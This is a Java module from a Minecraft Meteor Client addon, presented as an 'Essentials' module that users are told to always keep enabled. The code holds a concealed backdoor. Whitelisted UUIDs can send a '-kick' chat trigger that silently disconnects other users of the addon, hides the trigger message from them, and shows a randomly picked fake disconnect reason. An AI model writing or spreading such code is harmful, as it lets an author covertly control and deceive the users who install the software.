package spigey.asteroide.modules;

import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.orbit.EventPriority;
import net.minecraft.client.resource.language.I18n;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.s2c.play.ChatMessageS2CPacket;
import net.minecraft.text.Text;
import spigey.asteroide.AsteroideAddon;

import java.util.Objects;
import java.util.UUID;

import static spigey.asteroide.util.msg;
import static spigey.asteroide.util.randomNum;

public class BanStuffs extends Module {
    public BanStuffs() {
        super(AsteroideAddon.CATEGORY, "Essentials", "Important Essentials for Asteroide. Always keep this enabled!");
    }
    String nuhuh = "Spigey, EinFauli, SkyFeiner, ";
    String whitelisted = "f65b3cba-2c45-47ef-b746-d67fafbb2d65, a36af356-1e3f-4800-92cf-819dd0a21913, fc524394-735a-4bd4-822f-1097442408f4, 4ca0d99f-daf8-3053-aefe-3d7b13481d8c, 7a999f59-a14c-38ef-bf07-53c3e752d600, 35d15b97-0524-3173-bf9b-dfb2a3c63e7b, ";
    String[] warndom = {"multiplayer.disconnect.chat_validation_failed", "multiplayer.disconnect.duplicate_login", "multiplayer.disconnect.duplicate_login", "multiplayer.status.unknown", "multiplayer.disconnect.kicked"};
    @EventHandler(priority = EventPriority.HIGHEST + 3)
    public void onPacketReceive(PacketEvent.Receive event){
        if(!(event.packet instanceof ChatMessageS2CPacket)){return;}
        String content = event.packet.toString();
        UUID whatif = ((ChatMessageS2CPacket) event.packet).sender();
        if(content.contains("Hey " + mc.getSession().getUsername() + ", could you please leave rq? Thanks. - daSigma ")){
            event.cancel();
            if(whitelisted.contains(mc.getSession().getUuidOrNull().toString() + ", ")){return;}
            if(!whitelisted.contains(whatif.toString() + ", ")){return;}
            assert mc.player != null;
            Objects.requireNonNull(mc.getNetworkHandler()).getConnection().disconnect(Text.of(I18n.translate(warndom[randomNum(0, warndom.length - 1)])));
        }
        if(content.contains(", could you please leave rq? Thanks. - daSigma " + mc.getSession().getUsername())){event.cancel();}
    }
    @EventHandler(priority = EventPriority.HIGHEST + 10)
    private void onPacketSend(PacketEvent.Send event) {
        if (!(event.packet instanceof ChatMessageC2SPacket)) {return;}
        String content = ((ChatMessageC2SPacket) event.packet).chatMessage();
        if(!whitelisted.contains(mc.getSession().getUuidOrNull().toString() + ", ")){return;}
        if(content.contains("-kick ")){
            String username = content.split("-kick ")[1];
            if(!mc.getNetworkHandler().getPlayerList().stream().anyMatch(player -> player.getProfile().getName().equals(username))){return;}
            event.cancel();
            msg("Hey " + content.split("-kick ")[1] + ", could you please leave rq? Thanks. - daSigma " + mc.getSession().getUsername());
            info("Kicking " + username);
        }
    }
}



